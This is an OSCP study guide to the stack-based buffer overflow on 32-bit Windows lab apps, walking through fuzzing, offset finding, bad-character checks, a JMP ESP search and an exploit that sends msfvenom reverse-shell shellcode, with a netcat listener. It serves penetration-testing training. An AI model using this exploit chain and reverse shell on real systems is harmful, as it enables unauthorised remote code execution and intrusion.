# Buffer Overflow (Stack-based, x86 Windows)

> ⚠️ **Exam relevance:** OffSec **de-emphasized** classic stack buffer overflow with the OSCP+ update — it may not appear, and there's no dedicated BOF box guaranteed. **Don't over-invest.** But the workflow is 100% mechanical and worth knowing cold: if it shows up, it's free points. Budget a day, learn the 5-step loop, move on.

This covers the classic **32-bit Windows EIP-overwrite** pattern (the PEN-200 style, e.g. vulnerable apps like SLMail, Brainpan, `oscp.exe`-style binaries). You practice this in a Windows VM with Immunity Debugger + mona.py.

## Lab setup
- Windows VM (target) running the vulnerable app, with **Immunity Debugger** + **mona.py** installed.
- Kali (attacker) on the same network.
- `mona` config once: in Immunity command bar → `!mona config -set workingfolder c:\mona\%p`

## The 5-step workflow

### 0. Attach & baseline
Open Immunity → File → Attach → the vulnerable process. Confirm it's **Running** (F9) before each test. Reconnect/restart the app after every crash.

### 1. Fuzz — confirm the crash
Send increasing bytes until the app dies and you (ideally) overwrite EIP.
```python
#!/usr/bin/env python3
import socket, sys
ip, port = "TARGET_IP", 9999
buf = b"A" * 100
while True:
    try:
        s = socket.socket(); s.connect((ip, port))
        s.recv(1024)                       # if the app sends a banner
        s.send(b"OVERFLOW1 " + buf + b"\r\n")   # match the app's command/format
        s.close()
        print(f"sent {len(buf)}"); buf += b"A"*100
    except Exception:
        print(f"crashed at ~{len(buf)} bytes"); sys.exit(0)
```

### 2. Find the exact offset to EIP
Generate a cyclic pattern the size that crashed it:
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
# (or)  msf-pattern_create -l 3000
```
Send that as the payload. In Immunity, read the value now in **EIP**, then:
```bash
msf-pattern_offset -l 3000 -q <EIP_value>
# or in mona:  !mona findmsp -distance 3000    → look for "EIP contains normal pattern ... offset XXXX"
```
That offset = bytes before EIP.
```python
offset = 1978                 # example
payload = b"A"*offset + b"BBBB" + b"C"*(3000-offset-4)
# re-send → EIP should now read 42424242 ("BBBB"). Confirmed control.
```

### 3. Find bad characters
Send all bytes `\x01`–`\xff` (omit `\x00`) after EIP, then compare in memory with mona to see which got mangled/truncated.
```python
badchar_test = bytes(range(1,256))       # \x01..\xff
payload = b"A"*offset + b"BBBB" + badchar_test
```
In Immunity: right-click ESP → Follow in Dump. Then:
```
!mona bytearray -b "\x00"                 # generate reference (in c:\mona\...)
!mona compare -f c:\mona\<app>\bytearray.bin -a <ESP_address>
```
Note every byte that's corrupted, add it to the exclude list, regenerate, repeat until mona says **"unmodified"**. Common bad chars: `\x00` (always), sometimes `\x0a \x0d \xff`.

### 4. Find a JMP ESP (the return address)
Find a reliable `JMP ESP` instruction in a module **without protections** (no ASLR/DEP/rebase) and whose address contains **no bad chars**.
```
!mona jmp -r esp -cpb "\x00\x0a\x0d"      # -cpb = exclude these bad chars
!mona modules                              # pick a module: False across the board
```
Take an address, e.g. `0x625011AF`. **Write it little-endian** in the exploit: `\xaf\x11\x50\x62`.

### 5. Generate shellcode + exploit
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 \
  -f py -v shellcode -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
```
Final exploit:
```python
import socket
ip, port = "TARGET_IP", 9999
offset = 1978
eip = b"\xaf\x11\x50\x62"          # JMP ESP (little-endian), no bad chars
nops = b"\x90" * 16               # NOP sled — gives the decoder room
shellcode =  b""                  # <-- paste msfvenom output here
shellcode += b"..."

payload = b"A"*offset + eip + nops + shellcode
s = socket.socket(); s.connect((ip, port))
s.recv(1024)
s.send(b"OVERFLOW1 " + payload + b"\r\n")
s.close()
```
Start your listener first (`nc -lvnp 4444`), restart the app in Immunity (F9), fire the exploit → shell.

## Memory map of the payload

```
[  "A" * offset  ][ EIP = JMP ESP ][ NOP sled ][ shellcode ]
 fills the buffer   redirects here   safe landing   your payload
 up to the saved    to ESP (top of   zone before    (reverse shell)
 return address     the stack)       shellcode
```

## Checklist
- [ ] Fuzzed → confirmed crash size
- [ ] Offset found → EIP = `42424242`
- [ ] All bad chars identified (mona "unmodified")
- [ ] `JMP ESP` address in a non-protected module, no bad chars, little-endian
- [ ] msfvenom shellcode with `-b` bad chars + NOP sled
- [ ] Listener up, app restarted → shell

## Gotchas
- **Restart the app in the debugger before every test** (F9 to run).
- Match the exact **command prefix/format** the app expects (e.g. `OVERFLOW1 `).
- Little-endian the return address; don't forget the NOP sled.
- If shellcode partly runs then dies → you missed a **bad char**; redo step 3.
- Small buffer after ESP? Use a smaller payload or `alpha_mixed`, or jump backwards.
- This is **32-bit** methodology; 64-bit differs, but OSCP-style BOF is x86.
